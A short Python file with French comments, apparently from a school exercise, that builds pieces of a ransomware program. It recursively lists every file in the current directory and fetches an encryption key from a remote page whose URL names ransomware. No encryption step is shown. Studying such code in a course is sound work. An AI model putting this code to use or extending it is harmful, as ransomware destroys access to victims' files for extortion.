# -*- coding: utf-8 -*-

from path import Path
import requests


def get_file():
    #==========================================
    #Cette fonction permet de récupérer le path de 
    # l'ensemble des fichier présent dans le dossier
    # courant et tous les sous-dossiers
    #==========================================
    files = []
    #Parcours les fichiers
    for f in Path('.').walkfiles():
        files.append(f)
    return files

def get_key():
    #==========================================
    #Cette fonction permet de récupérer une clef
    # sur une page ESIEE
    #==========================================
    response = requests.get('https://perso.esiee.fr/~guillote/ransomware/')
    #Si la clef a été correctement récupérée
    if (response.status_code == requests.codes.ok):
        #On change le format de la page web pour enlever les ''
        return str(response.content)[1:].replace('\'', '')

